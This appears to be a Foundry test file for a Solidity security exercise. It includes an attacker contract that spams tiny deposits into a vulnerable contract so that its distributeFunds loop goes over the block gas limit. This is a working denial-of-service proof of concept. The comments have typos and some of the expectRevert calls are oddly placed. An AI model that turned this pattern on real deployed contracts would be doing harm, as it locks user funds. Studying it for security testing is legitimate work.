// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/VulnerableDosCallContract.sol";

contract AttackContract {
    VulnerableDosCallContract public target;

    constructor(address _target) {
        target = VulnerableDosCallContract(_target);
    }

    function attack() external {
        // Spam the recipients array to exceed block gas limit
        for (uint256 i = 0; i < 10000; i++) {
            target.deposit{value: 1 wei}();
        }
    }
}

contract DosBLockGasLimit is Test {
    VulnerableDosCallContract public vulnerable;
    AttackContract public attacker;
    address public attackerAddress = address(0x123);
    address[10] public users;

    function setUp() public {
        vulnerable = new VulnerableDosCallContract();
        vm.deal(attackerAddress, 50000 ether);
        vm.startPrank(attackerAddress);
        attacker = new AttackContract(address(vulnerable));
        vm.deal(address(attacker), 5000 ether);
        vm.stopPrank();

        // Load 10 recipients
        for (uint256 i = 0; i < 10; i++) {
            users[i] = address(uint160(i + 1));
            vm.deal(users[i], 1 ether);
            vm.prank(users[i]);
            vulnerable.deposit{value: 0.5 ether}();
        }
    }

    //This should revert with an EVMError: OutOFFunds
    //This means the attack sacrifices all his gas just to hurt the prootcol
    //Becasue etehreum block gas limit is 30 million
    function testDoSWithBlockGasLimit() public {
        vm.startPrank(attackerAddress);
        console.log(
            "Attacker Balance Before Attack:",
            address(attacker).balance
        );

        attacker.attack();
        vm.expectRevert();
        vm.stopPrank();

        console.log("Starting fund distribution...");

        vm.expectRevert(); // Expect failure due to block gas limit
        vm.prank(attackerAddress);
        vulnerable.distributeFunds();

        console.log("Fund distribution failed due to gas limit exhaustion!");
    }
}
